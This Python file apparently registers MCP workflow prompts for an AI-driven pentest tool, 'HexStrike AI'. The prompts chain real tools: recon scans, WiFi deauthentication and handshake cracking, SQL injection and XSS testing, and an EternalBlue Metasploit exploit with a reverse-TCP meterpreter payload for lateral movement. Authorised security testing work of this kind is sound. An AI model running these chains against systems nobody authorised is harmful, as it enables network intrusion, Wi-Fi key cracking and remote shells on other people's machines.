"""
mcp_core/prompts.py

FastMCP 3.x native workflow prompts for HexStrike AI.

Each @mcp.prompt() defines a structured multi-step workflow that Claude
can invoke directly. Prompts use run_security_tool() — the Phase 3
direct execution interface — with exact tool names from DIRECT_TOOLS.

Return type: list[str] — FastMCP 3.1.1 converts strings to user messages.

Registered in setup_mcp_server_standalone() via register_prompts().

Skills reference:
  nmap-recon, subdomain-enum, web-recon, web-vuln,
  password-cracking, smb-enum, exploitation, cloud-audit
"""

from fastmcp import FastMCP


def register_prompts(mcp: FastMCP) -> None:
    """Register all HexStrike workflow prompts."""

    @mcp.prompt()
    async def bug_bounty_recon(target: str) -> list[str]:
        """
        Full bug bounty reconnaissance workflow.
        Skills: subdomain-enum + nmap-recon + web-recon + web-vuln

        Args:
            target: Root domain to recon (e.g. 'example.com')
        """
        return [
            f"Bug bounty reconnaissance workflow on target: {target}",
            "STEP 1 — Subdomain enumeration",
            f'run_security_tool(tool_name="subfinder", parameters=\'{{"domain": "{target}", "silent": true}}\')',
            f'run_security_tool(tool_name="amass", parameters=\'{{"domain": "{target}", "mode": "enum"}}\')',
            "STEP 2 — Probe live hosts and fingerprint tech stack",
            f'run_security_tool(tool_name="httpx", parameters=\'{{"target": "{target}", "probe": true, "tech_detect": true, "title": true, "status_code": true}}\')',
            "STEP 3 — Fast port discovery then service detection",
            f'run_security_tool(tool_name="rustscan", parameters=\'{{"target": "{target}", "ports": "1-65535"}}\')',
            f'run_security_tool(tool_name="nmap", parameters=\'{{"target": "{target}", "additional_args": "-sV -sC -T4"}}\')',
            "STEP 4 — Web content and directory discovery",
            f'run_security_tool(tool_name="wafw00f", parameters=\'{{"url": "https://{target}"}}\')',
            f'run_security_tool(tool_name="katana", parameters=\'{{"url": "https://{target}"}}\')',
            f'run_security_tool(tool_name="gobuster", parameters=\'{{"url": "https://{target}", "mode": "dir", "wordlist": "/usr/share/wordlists/dirb/common.txt", "additional_args": "-x php,html,txt"}}\')',
            "STEP 5 — Broad CVE and vulnerability scan",
            f'run_security_tool(tool_name="nuclei", parameters=\'{{"target": "https://{target}", "severity": "critical,high"}}\')',
            f'run_security_tool(tool_name="nikto", parameters=\'{{"target": "https://{target}"}}\')',
            f"FINAL — Compile findings for {target}: subdomains discovered, open ports, tech stack, vulnerabilities. Prioritise critical/high severity findings and identify attack surface.",
        ]

    @mcp.prompt()
    async def wifi_attack_chain(interface: str, bssid: str, channel: str = "6") -> list[str]:
        """
        Full WiFi WPA/WPA2 handshake capture and crack chain.
        Skills: wifi_pentest

        Args:
            interface: Wireless interface (e.g. 'wlan0')
            bssid:     Target AP MAC address (e.g. 'AA:BB:CC:DD:EE:FF')
            channel:   Target AP channel (default '6')
        """
        return [
            f"WiFi attack chain — interface: {interface} | BSSID: {bssid} | channel: {channel}",
            "STEP 1 — Enable monitor mode",
            f'run_security_tool(tool_name="airmon_ng", parameters=\'{{"interface": "{interface}", "action": "start"}}\')',
            "STEP 2 — Start targeted capture (keep running during deauth)",
            f'run_security_tool(tool_name="airodump_ng", parameters=\'{{"interface": "{interface}mon", "bssid": "{bssid}", "channel": "{channel}", "output_prefix": "/tmp/hexstrike_capture"}}\')',
            "STEP 3 — Force client deauthentication to capture handshake",
            "⚠️ User confirmation required before executing deauth attack",
            f'run_security_tool(tool_name="aireplay_ng", parameters=\'{{"interface": "{interface}mon", "attack_mode": 0, "bssid": "{bssid}", "count": 10}}\')',
            "STEP 4 — Crack captured handshake with rockyou wordlist",
            f'run_security_tool(tool_name="aircrack_ng", parameters=\'{{"capture_files": ["/tmp/hexstrike_capture-01.cap"], "wordlist": "/usr/share/wordlists/rockyou.txt", "bssid": "{bssid}"}}\')',
            "STEP 5 — Restore managed mode",
            f'run_security_tool(tool_name="airmon_ng", parameters=\'{{"interface": "{interface}mon", "action": "stop"}}\')',
            f"FINAL — Report: handshake capture status, cracking result for BSSID {bssid}. If KEY NOT FOUND, suggest hashcat GPU cracking with rules.",
        ]

    @mcp.prompt()
    async def ctf_web_challenge(url: str) -> list[str]:
        """
        CTF web challenge enumeration and exploitation workflow.
        Skills: web-recon + web-vuln

        Args:
            url: Challenge URL (e.g. 'http://challenge.ctf.local:8080')
        """
        return [
            f"CTF web challenge workflow on: {url}",
            "STEP 1 — Fingerprint tech stack and check for WAF",
            f'run_security_tool(tool_name="wafw00f", parameters=\'{{"url": "{url}"}}\')',
            f'run_security_tool(tool_name="httpx", parameters=\'{{"target": "{url}", "probe": true, "tech_detect": true, "title": true}}\')',
            f'run_security_tool(tool_name="nikto", parameters=\'{{"target": "{url}"}}\')',
            "STEP 2 — Directory and file discovery",
            f'run_security_tool(tool_name="gobuster", parameters=\'{{"url": "{url}", "mode": "dir", "wordlist": "/usr/share/wordlists/dirb/common.txt", "additional_args": "-x php,html,txt,bak,old,zip"}}\')',
            f'run_security_tool(tool_name="ffuf", parameters=\'{{"url": "{url}/FUZZ", "wordlist": "/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt", "match_codes": "200,204,301,302,307,401,403"}}\')',
            f'run_security_tool(tool_name="katana", parameters=\'{{"url": "{url}"}}\')',
            "STEP 3 — Broad vulnerability scan",
            f'run_security_tool(tool_name="nuclei", parameters=\'{{"target": "{url}"}}\')',
            "STEP 4 — SQL injection",
            f'run_security_tool(tool_name="sqlmap", parameters=\'{{"url": "{url}", "additional_args": "--batch --level=3 --risk=2 --dbs"}}\')',
            "STEP 5 — XSS on reflected parameters",
            f'run_security_tool(tool_name="dalfox", parameters=\'{{"url": "{url}"}}\')',
            "STEP 6 — Directory traversal",
            f'run_security_tool(tool_name="dotdotpwn", parameters=\'{{"target": "{url}", "additional_args": "-m http -o unix"}}\')',
            f"FINAL — Compile CTF findings for {url}: flags found, vulnerabilities confirmed, exploitation path. Check /etc/passwd, /flag, /flag.txt common CTF flag locations.",
        ]

    @mcp.prompt()
    async def smb_lateral_movement(target: str) -> list[str]:
        """
        SMB enumeration and lateral movement workflow.
        Skills: smb-enum + exploitation

        Args:
            target: Target IP or CIDR range (e.g. '10.10.10.10' or '192.168.1.0/24')
        """
        return [
            f"SMB lateral movement workflow on target: {target}",
            "STEP 1 — NetBIOS discovery and SMB version check",
            f'run_security_tool(tool_name="nbtscan", parameters=\'{{"target": "{target}"}}\')',
            f'run_security_tool(tool_name="nmap", parameters=\'{{"target": "{target}", "ports": "445,139", "additional_args": "-sV -sC --script smb-vuln-*,smb-security-mode,smb2-security-mode"}}\')',
            "STEP 2 — Null session enumeration (users, shares, password policy)",
            f'run_security_tool(tool_name="enum4linux", parameters=\'{{"target": "{target}", "additional_args": "-a"}}\')',
            f'run_security_tool(tool_name="smbmap", parameters=\'{{"target": "{target}"}}\')',
            "STEP 3 — Check for EternalBlue (MS17-010)",
            f'run_security_tool(tool_name="nmap", parameters=\'{{"target": "{target}", "ports": "445", "additional_args": "--script smb-vuln-ms17-010"}}\')',
            "STEP 4 — Credential testing and access check",
            f'run_security_tool(tool_name="netexec", parameters=\'{{"target": "{target}", "protocol": "smb"}}\')',
            "STEP 5 — Exploit EternalBlue if MS17-010 confirmed",
            "⚠️ User confirmation required before running exploit module",
            f'run_security_tool(tool_name="metasploit", parameters=\'{{"module": "exploit/windows/smb/ms17_010_eternalblue", "options": {{"RHOSTS": "{target}", "PAYLOAD": "windows/x64/meterpreter/reverse_tcp"}}}}\')',
            f"FINAL — Report SMB findings for {target}: shares accessible, users enumerated, vulnerabilities confirmed, lateral movement paths identified.",
        ]

    @mcp.prompt()
    async def cloud_security_audit(provider: str = "aws", profile: str = "default") -> list[str]:
        """
        Cloud security audit workflow.
        Skills: cloud-audit

        Args:
            provider: Cloud provider ('aws', 'azure', 'gcp')
            profile:  Cloud credential profile (default 'default')
        """
        return [
            f"Cloud security audit — provider: {provider} | profile: {profile}",
            "STEP 1 — Cloud configuration and compliance audit (prowler)",
            f'run_security_tool(tool_name="prowler", parameters=\'{{"provider": "{provider}", "profile": "{profile}"}}\')',
            "STEP 2 — Container image vulnerability scan (trivy)",
            f'run_security_tool(tool_name="trivy", parameters=\'{{"target": "nginx:latest", "scan_type": "image", "severity": "HIGH,CRITICAL"}}\')',
            "STEP 3 — Kubernetes cluster assessment if applicable",
            f'run_security_tool(tool_name="kube_hunter", parameters=\'{{"additional_args": "--remote <k8s_api_ip>"}}\')',
            f"FINAL — Cloud audit report for {provider}: IAM misconfigurations, public resources, container CVEs, Kubernetes attack surface. Prioritise CRITICAL findings.",
        ]
